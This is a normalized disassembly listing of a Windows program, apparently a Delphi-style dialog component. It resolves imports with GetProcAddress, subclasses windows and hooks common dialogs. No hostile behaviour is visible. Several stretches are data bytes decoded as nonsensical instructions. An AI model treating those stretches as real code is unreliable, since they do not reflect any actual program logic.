mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_426364
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42615c
xor eax eax
push ebp
push sub_426717
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42671e
mov eax [ rw-data ]
call sub_426164
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426ac8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426af0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b38
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b3f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403104
call sub_4261a4
cmp [ rw-data ] 0x0
jg r-xdata
sub_426b60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b8c
retn
sub_426b98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426bbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bc4
retn
sub_426bd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426bf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bfc
retn
sub_426c08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c34
retn
sub_426c40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c6c
retn
sub_426c78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ca4
retn
sub_426ce1
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_426d09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d10
retn
sub_426d24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d50
retn
sub_426d5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d88
retn
sub_426d98
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
outsb
inc edx
add [ eax + 0x6e ] al
inc edx
add [ eax ] bl
add [ eax ] al
cmp [ esi ] ah
inc ecx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax ] ah
jbe r-xdata
jne r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah al
jne r-xdata
insd
insd
outsd
outsb
add al dh
jbe r-xdata
add [ edx ] al
add [ eax ] dl
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x648fffbf ] ah
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ ebp + esi * 2 + 0x42 ] bh
add [ esi + esi * 2 + 0x75f80042 ] ah
inc edx
inc esp
imul esp [ ecx + 0x6c ] 0x6de0676f
inc edx
add [ edi ] dh
inc ecx
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
push 0x38004113
add [ eax ] al
add [ edx - 0x11001100 ] eax
[ esi + esi * 2 + 0x76c40042 ]
add [ eax + 0x29 ] al
inc eax
add [ 0x10000200 ] al
sub_4272cf
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
push es
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x40103c72
add [ eax ] dl
add [ edx ] 0xff000064
or al 0x0
or [ edi + 0x70 ] ecx
je r-xdata
jb r-xdata
insb
jb r-xdata
outsd
outsb
jae r-xdata
outsb
jae r-xdata
outsb
js r-xdata
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or al 0x4f
outsb
push esp
jns r-xdata
push 0x65676e61
aam 0x13
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110010 ] al
outsb
aam 0x13
js r-xdata
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x8
add [ ebx ] cl
add [ edi ] al
dec edi
jo r-xdata
jo r-xdata
je r-xdata
adc [ eax ] al
insb
add [ eax ] al
jmp [ eax ]
call sub_4542d0
mov ebx eax
jmp r-xdata
inc ebx
push 0x65676e61
and al 0x71
inc edx
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0012 ] al
outsb
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
dec ecx
je r-xdata
xchg esp eax
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
inc esi
outsd
call [ eax + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] 0x4270e473
cli
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jpe r-xdata
insd
inc eax
add [ eax + 0x78004280 ] bh
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_457a34
mov edi eax
mov eax ebx
call sub_457a18
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_457a00
mov edi eax
mov eax ebx
call sub_457a4c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
add eax 0xf88b0003
insd
add bh bh
jo r-xdata
add [ eax ] al
inc ecx
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
aam 0x13
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
inc esp
popa
jne r-xdata
add [ eax + 0xb004281 ] dl
push esp
dec edi
jo r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69540500
je r-xdata
js r-xdata
je r-xdata
imul ebp [ ebp + 0x4e ] 0x94656d61
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
inc esi
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
pop esp
jb r-xdata
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
aam 0x13
inc ecx
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0011 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000e ] al
outsb
inc ebx
popad
outsb
inc ebx
insb
outsd
jae r-xdata
enter 0x44fa 0x0
mov al [ 0xffffffffa0ff0000 ]
jb r-xdata
js r-xdata
insb
add [ edi ] al
or edx [ edi + ecx * 2 + 0x70 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x71b4676f
inc edx
add [ eax + 0x6e ] dl
inc edx
add [ ebx ] dl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0xd73676f
add [ eax + edx + 0x740040 ] dl
add bh bh
je r-xdata
or [ edx ] 0x0
or cl [ ecx + 0x6e ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
or eax [ esi + 0x69 ]
insb
je r-xdata
adc [ eax ] al
adc [ ecx + 0x640042 ] al
add bh bh
imul esi [ ecx + ebp * 2 + 0x61 ] 0x7269446c
xchg esp eax
jo r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a000a ] al
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080007 ] al
mov al [ 0xffffffffb800406d ]
add [ edx ] 0x78
add [ eax + eax ] bl
sub_427460
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_457d30
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_4542d0
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_4542d0
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_457a34
mov edi eax
mov eax ebx
call sub_457a18
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_457a00
mov edi eax
mov eax ebx
call sub_457a4c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_427514
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_427460
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42757c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419854
mov [ esi + 0x30 ] 0x1
push esi
push sub_427658
call sub_41a8e4
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4275c4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
test bl bl
jle r-xdata
call sub_41a97c
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4275f8
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45a724
mov cl 0x1
sub_427620
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403354
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427658
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4035a4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4276f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45111c
mov [ ebp - 0x14 ] eax
call sub_451038
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4277b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a014
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_427785
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42778c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a070
retn
sub_42778c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277ba
mov eax [ ebp - 0x14 ]
call sub_4511d0
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_451040
retn
sub_4277ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_427460
sub_427870
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42757c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4278e9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403104
mov eax [ esi + 0x58 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4275c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_427924
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_427fac
mov eax edi
mov si 0xffed
call sub_403300
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_42794c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_4276a4
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_427990 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_427924
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403300
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403300
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403300
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403300
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403300
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_427a48
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_427ad0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_427b02
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_417b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b09
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_427b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419bcc
push ebx
push sub_427ad0
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_427b50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403e54
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404160
mov eax [ ebx ]
call sub_404314
mov dl 0x7c
call sub_40c3c8
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c3c8
test eax eax
jne r-xdata
sub_427ba0
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_427e51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402b18
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_427b50
mov eax [ ebp - 0x8 ]
call sub_404314
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404314
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4044a0
mov eax [ ebp - 0xc ]
call sub_404314
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402b18
mov eax [ ebx + 0x78 ]
call sub_404314
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408568
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404314
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404314
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_40840c
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_4043b4
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_403eec
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_427514
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
